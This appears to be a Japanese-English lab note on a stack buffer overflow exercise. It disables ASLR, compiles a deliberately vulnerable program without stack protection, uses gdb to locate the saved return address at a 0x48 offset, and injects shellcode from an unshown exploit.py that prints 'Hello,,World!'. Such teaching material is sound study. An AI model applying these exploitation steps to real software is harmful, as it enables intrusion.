
- aslr無効

```
$ sudo sysctl -w kernel.randomize_va_space=0
```

(元に戻す)

```
$ sudo sysctl -w kernel.randomize_va_space=2
```

- build & execute

```
$ g++ input_buffer_overflow.cc -o input_buffer_overflow -fno-stack-protector -z execstack
$ ./input_buffer_overflow 
abcdefg
$ ./input_buffer_overflow 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (コアダンプ)
```

- find the stack address where return address from main is stored

```
$ gdb ./input_buffer_overflow

gdb-peda$ b main
Breakpoint 1 at 0x1159
gdb-peda$ run

gdb-peda$ disas
Dump of assembler code for function main:
   0x0000555555555155 <+0>:     push   rbp
   0x0000555555555156 <+1>:     mov    rbp,rsp
=> 0x0000555555555159 <+4>:     sub    rsp,0x40
   0x000055555555515d <+8>:     lea    rax,[rbp-0x40]
   0x0000555555555161 <+12>:    mov    rsi,rax
   0x0000555555555164 <+15>:    lea    rdi,[rip+0xe9a]        # 0x555555556005
   0x000055555555516b <+22>:    mov    eax,0x0
   0x0000555555555170 <+27>:    call   0x555555555040 <__isoc99_scanf@plt>
   0x0000555555555175 <+32>:    mov    eax,0x0
   0x000055555555517a <+37>:    leave  
   0x000055555555517b <+38>:    ret    
End of assembler dump.

gdb-peda$ x/10xg $rbp-0x40
0x7fffffffde50: 0x0000000000000002      0x0000555555555225
0x7fffffffde60: 0x00007ffff7fe2b20      0x0000000000000000
0x7fffffffde70: 0x00005555555551e0      0x0000555555555070
0x7fffffffde80: 0x00007fffffffdf70      0x0000000000000000
0x7fffffffde90: 0x00005555555551e0      0x00007ffff7c0cb6b

gdb-peda$ x 0x00007ffff7c0cb6b
0x7ffff7c0cb6b <__libc_start_main+235>: 0x480002084ee8c789
```
0x7fffffffde50 => &buff[0]
0x7fffffffde98 (=&buff[0]+0x48) => the address where return address (0x00007ffff7c0cb6b) is stored

- generate shellcode bin

```
$ python3 exploit.py
```

- input shellcode bin to input_buffer_overflow

```
$ gdb ./input_buffer_overflow 

gdb-peda$ run < shellcode.bin
Starting program: ./input_buffer_overflow < shellcode.bin
Hello,,World!��[Inferior 1 (process 19810) exited normally]
```
